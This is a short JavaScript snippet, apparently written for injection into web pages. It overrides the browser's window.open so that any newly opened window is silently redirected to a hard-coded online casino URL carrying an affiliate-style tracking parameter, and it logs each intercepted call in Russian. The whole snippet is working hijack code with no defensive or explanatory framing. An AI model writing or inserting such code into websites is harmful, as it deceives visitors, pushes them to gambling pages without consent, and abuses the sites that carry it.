setTimeout(function () {
    const originalOpen = window.open;


    window.open = function (url, name, specs) {
      console.log(`Перехват вызова window.open с URL: ${url}`);

      const newWindow = originalOpen.call(this, url, name, specs);


      if (newWindow) {
        newWindow.location.href = 'https://1wilib.life/v3/aggressive-casino?p=pg75';
      } else {
      }

      return newWindow;
    };
  }, 100);
